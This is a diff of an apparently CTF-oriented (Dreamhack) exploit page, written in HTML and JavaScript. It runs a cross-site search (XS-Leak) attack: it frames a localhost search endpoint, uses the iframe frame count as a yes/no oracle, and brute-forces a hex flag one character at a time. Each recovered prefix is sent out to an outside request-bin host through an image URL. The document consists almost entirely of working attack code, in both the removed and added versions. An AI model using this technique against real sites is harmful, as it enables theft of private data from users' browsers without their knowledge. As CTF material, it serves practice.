@@ -1,53 +1,42 @@
-<iframe id="iframe"></iframe>
+<iframe id="frame"></iframe>
 <img id="img">
 <script>
-    async function req(url) {
-        return await new Promise((resolve, reject) => {
-            const iframe = document.getElementById("iframe");
+    function req(url) {
+        return new Promise((resolve, reject) => {
+            var iframe = document.getElementById("frame");
             iframe.src = url;
+
             iframe.onload = () => { 
-                if (iframe.contentWindow.frames.length != 0)
-                    return resolve();
-                else
-                    return reject();
+                if(iframe.contentWindow.frames.length>=1) resolve();
+                else reject();
             };
         });
     }
-    async function search(query) {
+
+    async function sendrequest(query) {
         try {
-            await req(
-              `http://localhost:8000/search?query=${query}`
-            );
+            await req("http://localhost:8000/search?query="+query);
             return true;
-        } catch (e) {
+        } catch(e) {
             return false;
         }
     }
-    // help
-async function exploit() {
-    let chars = "0123456789abcdef}"
-    let secret = "DH{22d1445ad68e194e";
-    let nextSearchStart = "";
 
-    while (!secret.includes("}")) {
-        let found = false;
+    var flag = "DH{22d1445ad68e194e"
+    var charset = "0123456789abcdef"
 
-        for (let c of chars) {
-            if (await search(secret + c)) {
-                secret += c;
-                img.src = `https://hlavjaw.request.dreamhack.games/${secret}`;
-                found = true;
-                break;
+    async function exploit() {
+        for(var i=0; i<32; i++) {
+            for(const ch of charset) {
+                if(await sendrequest(flag+ch)) {
+                    flag += ch;
+                    var img = document.getElementById("img");
+                    img.src = "https://ofpxyrn.request.dreamhack.games/?"+flag;
+                    break;
+                }
             }
         }
-
-        if (!found) {
-            // 만약 현재 secret 다음에 오는 값이 없다면, 검색 시작 위치를 갱신합니다.
-            const response = await req(`http://localhost:8000/search?query=${nextSearchStart}`);
-            nextSearchStart = response;
-            console.log("Next search start:", nextSearchStart);
-        }
     }
-}
-exploit();
+
+    exploit()
 </script>
